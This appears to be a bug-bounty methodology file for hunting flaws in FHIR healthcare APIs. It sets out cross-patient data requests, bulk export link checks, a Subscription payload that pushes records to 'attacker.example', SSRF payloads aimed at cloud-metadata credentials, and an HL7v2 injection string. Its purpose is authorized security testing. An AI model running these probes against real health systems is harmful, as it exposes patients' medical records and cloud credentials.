---
name: hunt-healthcare-fhir
description: "Hunt healthcare-specific FHIR (HL7 FHIR R4) API vulnerabilities: CapabilityStatement recon, Patient-compartment IDOR and $everything cross-patient leakage, SMART on FHIR OAuth launch-context/scope-escalation flaws, search-parameter chaining/injection (_include, _revinclude, chained search), Bulk Data Export ($export) authorization gaps and unsecured NDJSON polling URLs, Subscription rest-hook SSRF, Reference-field SSRF, and HL7v2-to-FHIR gateway injection. Distinct from hunt-api-misconfig/hunt-graphql, which own generic REST/GraphQL exploitation once an endpoint is in hand — this owns the FHIR-spec delta: resource compartments, SMART launch context, bulk/subscription operations. Use when hunting an EHR, patient portal, health-information-exchange, telehealth target, or any /fhir/, /R4/, /DSTU2/, SMART-on-FHIR-branded API, or a schema with Patient, Observation, Bundle, Consent, Subscription resources."
sources: owasp_api_top10_2023, public_research
report_count: 0
---

## Why FHIR APIs Are a Distinct Risk Class

FHIR (HL7's REST-based healthcare interoperability standard) looks like an ordinary JSON REST
API, but three spec-specific mechanisms create a different attack surface than a typical
CRUD API:

- **Resource compartments are the primary access-control model, not per-endpoint roles.** Most
  FHIR servers scope access to "everything belonging to Patient/123" rather than to individual
  resource types — a single compartment-boundary bug leaks an entire patient's record (labs,
  meds, notes, diagnoses), not one field.
- **SMART on FHIR turns OAuth scope handling into the actual authorization boundary.** A launch
  context (`patient/*.read`, `launch/patient`) is supposed to bind an app's token to one patient;
  scope or launch-context bugs let one authorized session read across all patients.
- **Bulk and subscription operations move data at record-set scale by design.** `$export` and
  `Subscription` (rest-hook) exist specifically to push large PHI payloads out of the server —
  the same features that make FHIR useful for interoperability are the highest-severity targets
  when authorization on them is wrong.

Generic REST/GraphQL methodology (`hunt-api-misconfig`, `hunt-graphql`, `hunt-idor`) still
applies once you have a specific endpoint in hand — this skill's job is getting you to that point
via FHIR-specific recon and testing the operations that don't exist in a typical REST API.

---

## Attack Surface Signals

**URL / path patterns:**
```
/fhir/            /fhir/R4/          /fhir/DSTU2/       /baseR4/
/api/FHIR/R4/      /smart/           /.well-known/smart-configuration
/fhir/metadata     (CapabilityStatement — the FHIR equivalent of GraphQL introspection)
```

**Vendor / stack tells (each has known deployment quirks worth checking docs for):**
- Epic (`/api/FHIR/R4/`, App Orchard-registered SMART apps)
- Cerner/Oracle Health (`/r4/`, Cerner Ignite APIs)
- HAPI FHIR (open-source reference server — common in HIEs, research platforms, smaller EHRs)
- Athenahealth, Allscripts/Veradigm, eClinicalWorks — each expose SMART on FHIR per the CMS
  interoperability mandate (Patient Access API, Provider Directory API)

**First recon step — always pull the CapabilityStatement:**
```bash
curl -s https://target/fhir/metadata | jq '.rest[0].resource[] | {type, interaction: [.interaction[].code], searchParam: [.searchParam[].name]}'
```
This enumerates every resource type, every supported interaction (`read`, `search-type`,
`create`, `update`, `patch`, `delete`, `history-instance`), and every search parameter the
server accepts — your equivalent of a GraphQL schema dump. Also check
`/.well-known/smart-configuration` for the OAuth authorize/token endpoints and supported scopes.

---

## Step-by-Step Hunting Methodology

1. **Pull the CapabilityStatement and `.well-known/smart-configuration`** to map resources,
   interactions, search parameters, and the SMART OAuth endpoints before testing anything.

2. **Test Patient-compartment isolation directly.** Authenticate as patient A, then request
   `Patient/{B}/\$everything`, `Observation?patient=B`, and any other compartment-scoped search
   using patient B's ID. A response containing B's data with A's token is the core FHIR-specific
   IDOR.

3. **Enumerate patient IDs cheaply via `_include`/`_revinclude` chains** before assuming IDs are
   unguessable — many servers use sequential integer IDs (`Patient/1001`, `Patient/1002`) even
   when the UI never exposes them directly.

4. **Audit the SMART launch flow for scope and context binding.** Complete a standalone or
   EHR launch, capture the granted `scope` and `patient` claims in the token response, then
   replay a request for a *different* patient ID using the same token. If the server trusts the
   client-supplied `patient` query/path param over the token's bound context, that's a
   launch-context bypass.

5. **Check redirect_uri and PKCE enforcement on the SMART authorize endpoint** the same way
   you'd test any OAuth client (`hunt-oauth` methodology applies directly here) — SMART apps are
   often third-party and the authorize endpoint is internet-facing.

6. **Kick off a `$export` (Bulk Data Export) request and inspect the polling flow.** Per spec,
   the kick-off returns a `Content-Location` polling URL; once complete, that resolves to
   presigned NDJSON file URLs. Check whether: (a) the kick-off itself requires
   `system/*.read`-tier authorization appropriate to bulk access, not just patient-level read;
   (b) the returned file URLs require any auth at all, or are bearer-token-free presigned links
   valid for an unbounded time/IP range.

7. **Create a `Subscription` resource with a `channel.type: rest-hook` pointing at an
   attacker-controlled endpoint** and check: does the server validate/allowlist
   `channel.endpoint` before accepting the subscription (SSRF into internal services)? For
   `payload` set to a full resource (vs. id-only), does the pushed webhook body actually contain
   PHI reachable by an attacker who never had read access to the underlying resource?

8. **Test Reference-field dereferencing for SSRF.** Fields like
   `DocumentReference.content.attachment.url`, `Patient.photo.url`, or `Binary` references can be
   fetched server-side during rendering/validation (`$validate`, terminology `$expand` operations
   against an external `ValueSet.url`) — same SSRF class as `hunt-ssrf`, FHIR-specific entry point.

9. **Fuzz search-parameter modifiers and chaining** (`:exact`, `:contains`, `:missing`, chained
   search like `subject:Patient.name=Smith`, reverse chaining `_has:Observation:patient:code=X`)
   for both authorization bypass (does chaining escape the compartment filter?) and injection if
   the server builds a raw query from the parameter without proper escaping.

10. **Check conditional-operation race conditions.** `If-None-Exist` on conditional create is
    meant to prevent duplicate resources; race two conditional-create requests for the same
    patient/identifier to see whether the check-then-create is atomic.

---

## Payload & Detection Patterns

**CapabilityStatement recon (equivalent of GraphQL introspection):**
```bash
curl -s https://target/fhir/metadata | jq '.rest[0].resource[].type'
curl -s https://target/.well-known/smart-configuration | jq .
```

**Cross-patient `$everything` probe (core compartment-IDOR test):**
```bash
curl -s -H "Authorization: Bearer $PATIENT_A_TOKEN" \
  "https://target/fhir/Patient/PATIENT_B_ID/\$everything" | jq '.entry[].resource.resourceType'
```
Any entries returned = compartment isolation failed for this token.

**Search-based compartment bypass:**
```bash
curl -s -H "Authorization: Bearer $PATIENT_A_TOKEN" \
  "https://target/fhir/Observation?patient=PATIENT_B_ID&_count=50"
```

**Launch-context trust probe:**
```bash
# Token was issued for patient A via SMART launch; try substituting patient B's id
curl -s -H "Authorization: Bearer $TOKEN_SCOPED_TO_PATIENT_A" \
  "https://target/fhir/MedicationRequest?patient=PATIENT_B_ID"
```

**Bulk export kick-off + polling-URL exposure check:**
```bash
# Kick off (system-level export)
curl -s -X GET -H "Authorization: Bearer $TOKEN" -H "Accept: application/fhir+json" \
  -H "Prefer: respond-async" "https://target/fhir/\$export?_type=Patient,Observation"
# Response includes Content-Location — poll it
curl -s -H "Authorization: Bearer $TOKEN" "$CONTENT_LOCATION_URL"
# Once complete, test whether the returned NDJSON file URLs work WITHOUT the bearer token
curl -s "$NDJSON_FILE_URL_FROM_MANIFEST"   # no Authorization header
```

**Subscription SSRF / unauthenticated-push probe:**
```json
POST /fhir/Subscription
{
  "resourceType": "Subscription",
  "status": "requested",
  "reason": "test",
  "criteria": "Observation?patient=PATIENT_B_ID",
  "channel": {
    "type": "rest-hook",
    "endpoint": "https://attacker.example/collect",
    "payload": "application/fhir+json"
  }
}
```
If accepted and the endpoint isn't allowlisted, matching resource changes get pushed — full PHI
payload — to an attacker-controlled URL going forward. Also try
`"endpoint": "http://169.254.169.254/latest/meta-data/"` to test SSRF into cloud metadata.

**Reference SSRF via document/attachment URL:**
```json
POST /fhir/DocumentReference
{ "resourceType": "DocumentReference", "content": [{"attachment": {"url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/"}}] }
```
Trigger any operation that dereferences the attachment server-side (validation, rendering,
preview generation) and check for SSRF.

**Chained-search / reverse-chain probe:**
```bash
curl -s -H "Authorization: Bearer $TOKEN" \
  "https://target/fhir/Patient?_has:Observation:patient:code=http://loinc.org|other-patients-code"
```

**HL7v2-to-FHIR gateway injection (interface-engine targets only):**
```
PID|1||12345^^^MRN||Doe^John^^^^^L|^~\&#EXTRA-SEGMENT-INJECTION
```
If a name/identifier field containing HL7v2 delimiters (`|^~\&`) isn't escaped before the gateway
maps it into a FHIR JSON string, downstream parsing (this gateway or another one consuming the
same feed) can be desynced — treat as a v2/FHIR boundary injection class, not generic FHIR REST.

---

## Common Root Causes

1. **Access control implemented at the resource-type/endpoint level, not the compartment level.**
   The server correctly checks "can this token read `Observation` resources" but never checks
   "does this specific Observation belong to a patient this token is scoped to."
2. **SMART launch context trusted from a client-supplied parameter instead of the token's bound
   claims.** The authorize/token exchange correctly scopes the token to one patient, but resource
   endpoints re-read `patient=` from the query string instead of the token introspection result.
3. **Bulk-export file URLs treated as "obscure enough."** Presigned NDJSON URLs are long and
   random, so the team assumes they don't need their own auth check — but a URL that leaks (logs,
   referrer headers, browser history on a shared machine) becomes a standing PHI-export link.
4. **`Subscription.channel.endpoint` has no allowlist.** The Subscription resource-creation
   endpoint validates that the *caller* is authorized to create a subscription, but never
   validates that the *destination* endpoint is a domain the operator actually controls.
5. **Search-parameter chaining implemented as a generic query-builder** that doesn't re-apply the
   compartment filter at each hop of the chain — the base query is compartment-scoped, the
   chained/reverse-chained sub-query isn't.
6. **Reference/attachment URLs dereferenced server-side with no host allowlist**, inherited
   straight from generic SSRF root causes but reachable specifically via clinical-document and
   terminology-resolution features.

---

## Gate 0 Validation

1. **Did you retrieve real PHI/PII belonging to a patient other than the one your credentials are
   scoped to?** Resource-count or metadata-only leakage (e.g., knowing an ID exists) is weaker
   than an actual name/diagnosis/medication returned.
2. **Is the compartment/scope boundary crossed reproducibly, with a real token you hold** — not a
   hypothetical "if an attacker knew another patient's ID"? Show the exact request and response.
3. **For SSRF/Subscription findings: did the callback actually receive data**, or fire against an
   internal address? A subscription that's merely *accepted* without confirmed delivery is a
   weaker finding than one with a captured payload on a listener you control.
4. **For bulk-export findings: is the file URL usable without the original bearer token**, from a
   different IP/session? That's the concrete "this leaked link is independently exploitable" bar.

---

## Related Skills & Chains

- **`hunt-oauth`** — the SMART on FHIR authorize/token flow is standard OAuth 2.0 with
  healthcare-specific scopes and launch context; apply `hunt-oauth`'s redirect_uri, PKCE, and
  token-handling methodology directly to the SMART authorize endpoint.
- **`hunt-idor`** — the Patient-compartment bypass (methodology step 2) is a FHIR-specific
  instance of the general cross-account IDOR class, just scoped to a compartment instead of a
  single resource.
- **`hunt-ssrf`** — Reference-field dereferencing and unallowlisted Subscription endpoints are
  both SSRF entry points; reuse the cloud-metadata and internal-service payload set from there.
- **`hunt-api-misconfig`** — mass assignment via FHIR PATCH/PUT (client-writable
  `meta.security`, `managingOrganization`, or `active` fields) follows the same pattern as REST
  mass assignment generally.
- **`hunt-source-leak`** — mobile/web patient-portal clients frequently hardcode FHIR base URLs,
  client IDs, and sometimes bulk-export credentials in JS bundles or APK strings.
- **`evidence-hygiene`** — PHI is a stricter redaction category than generic PII; treat any
  captured patient name, MRN, diagnosis, or medication with the same black-bar discipline as
  financial account data, and never retain real patient data beyond what's needed to prove impact.
- **`triage-validation`** — apply Gate 0 above before drafting; "the compartment filter can be
  bypassed" without a captured cross-patient record is exactly the kind of "technically possible"
  claim Q6 exists to kill.
